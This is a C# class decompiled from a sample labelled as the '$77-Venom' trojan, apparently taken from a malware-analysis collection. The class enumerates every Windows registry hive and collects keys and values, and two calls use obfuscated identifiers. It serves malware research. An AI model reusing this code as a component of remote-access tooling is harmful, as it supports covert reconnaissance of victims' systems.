// Decompiled with JetBrains decompiler
// Type: xClient.Core.Registry.RegistrySeeker
// Assembly: $77-Venom, Version=2.1.0.0, Culture=neutral, PublicKeyToken=null
// MVID: DC8E8704-647D-4CA7-99AB-BB7BE936B486
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Zapchast.gen-815b2bf1ddadfb46a27001e08246e8f82f629eb793963bef856d17e1ef9c4085.exe

using Microsoft.Win32;
using System;
using System.Collections.Generic;

namespace xClient.Core.Registry
{
  public class RegistrySeeker
  {
    private readonly object locker = new object();
    private List<RegSeekerMatch> matches;

    public RegSeekerMatch[] Matches => this.matches != null ? this.matches.ToArray() : (RegSeekerMatch[]) null;

    public RegistrySeeker() => this.matches = new List<RegSeekerMatch>();

    public void BeginSeeking(string rootKeyName)
    {
      if (!string.IsNullOrEmpty(rootKeyName))
      {
        using (RegistryKey rootKey1 = RegistrySeeker.GetRootKey(rootKeyName))
        {
          if (rootKey1 != null && rootKey1.Name != rootKeyName)
          {
            string name = rootKeyName.Substring(rootKey1.Name.Length + 1);
            using (RegistryKey rootKey2 = rootKey1.OpenReadonlySubKeySafe(name))
            {
              if (rootKey2 == null)
                return;
              this.Seek(rootKey2);
            }
          }
          else
            this.Seek(rootKey1);
        }
      }
      else
        this.Seek((RegistryKey) null);
    }

    private void Seek(RegistryKey rootKey)
    {
      if (rootKey == null)
      {
        foreach (RegistryKey rootKey1 in RegistrySeeker.GetRootKeys())
          this.ProcessKey(rootKey1, rootKey1.Name);
      }
      else
        this.Search(rootKey);
    }

    private void Search(RegistryKey rootKey)
    {
      foreach (string subKeyName in rootKey.GetSubKeyNames())
        this.ProcessKey(rootKey.OpenReadonlySubKeySafe(subKeyName), subKeyName);
    }

    private void ProcessKey(RegistryKey key, string keyName)
    {
      if (key != null)
      {
        List<RegValueData> values = new List<RegValueData>();
        foreach (string valueName in key.GetValueNames())
        {
          RegistryValueKind valueKind = key.GetValueKind(valueName);
          object data = key.GetValue(valueName);
          values.Add(new RegValueData(valueName, valueKind, data));
        }
        this.AddMatch(keyName, 釯\u2661嶝䩕૧\uEA63蘙콭樱\u29B3ए콟矾딙Ṍ믮씪렧䔭Ǌ.杌ꅚ傫\u22C0삧䚫᱇䠐\u2F08曕믭㪘圊ꪲ韐映\u2EBC塚핓\u277B(values), key.SubKeyCount);
      }
      else
        this.AddMatch(keyName, 釯\u2661嶝䩕૧\uEA63蘙콭樱\u29B3ए콟矾딙Ṍ믮씪렧䔭Ǌ.\u9FE6佗䴄势鄼굕\uFFFD罇싿굎ꋏ䋙顰챢㐕ᥙ\uF64D嬦慇喟(), 0);
    }

    private void AddMatch(string key, RegValueData[] values, int subkeycount) => this.matches.Add(new RegSeekerMatch(key, values, subkeycount));

    public static RegistryKey GetRootKey(string subkeyFullPath)
    {
      string[] strArray = subkeyFullPath.Split('\\');
      try
      {
        switch (strArray[0])
        {
          case "HKEY_CLASSES_ROOT":
            return RegistryKey.OpenBaseKey(RegistryHive.ClassesRoot, RegistryView.Registry64);
          case "HKEY_CURRENT_USER":
            return RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, RegistryView.Registry64);
          case "HKEY_LOCAL_MACHINE":
            return RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64);
          case "HKEY_USERS":
            return RegistryKey.OpenBaseKey(RegistryHive.Users, RegistryView.Registry64);
          case "HKEY_CURRENT_CONFIG":
            return RegistryKey.OpenBaseKey(RegistryHive.CurrentConfig, RegistryView.Registry64);
          default:
            throw new Exception("Invalid rootkey, could not be found.");
        }
      }
      catch (SystemException ex)
      {
        throw new Exception("Unable to open root registry key, you do not have the needed permissions.");
      }
      catch (Exception ex)
      {
        throw ex;
      }
    }

    public static List<RegistryKey> GetRootKeys()
    {
      List<RegistryKey> rootKeys = new List<RegistryKey>();
      try
      {
        rootKeys.Add(RegistryKey.OpenBaseKey(RegistryHive.ClassesRoot, RegistryView.Registry64));
        rootKeys.Add(RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, RegistryView.Registry64));
        rootKeys.Add(RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64));
        rootKeys.Add(RegistryKey.OpenBaseKey(RegistryHive.Users, RegistryView.Registry64));
        rootKeys.Add(RegistryKey.OpenBaseKey(RegistryHive.CurrentConfig, RegistryView.Registry64));
      }
      catch (SystemException ex)
      {
        throw new Exception("Could not open root registry keys, you may not have the needed permission");
      }
      catch (Exception ex)
      {
        throw ex;
      }
      return rootKeys;
    }
  }
}
